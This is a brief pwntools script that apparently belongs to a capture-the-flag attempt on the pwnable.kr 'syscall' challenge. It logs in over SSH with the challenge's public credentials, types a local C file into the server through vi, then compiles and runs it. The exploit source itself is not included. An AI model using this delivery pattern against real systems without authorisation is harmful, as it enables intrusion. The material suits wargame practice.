from pwn import *

context.log_level = 'debug'

shell = ssh(host="pwnable.kr", port=2222, user="syscall", password="guest")
shell.recvline()
shell.recvuntil("/ $ ")
shell.sendline("cd tmp")
shell.sendline("vi c.c")
shell.sendline("a")
f = open("./clean.c", 'r')
shell.sendline(f.read())
f.close()
shell.sendline("\x1b") # esc
shell.sendline(":wq")
shell.sendline("gcc c.c")
shell.sendline("./a.out")
shell.recv()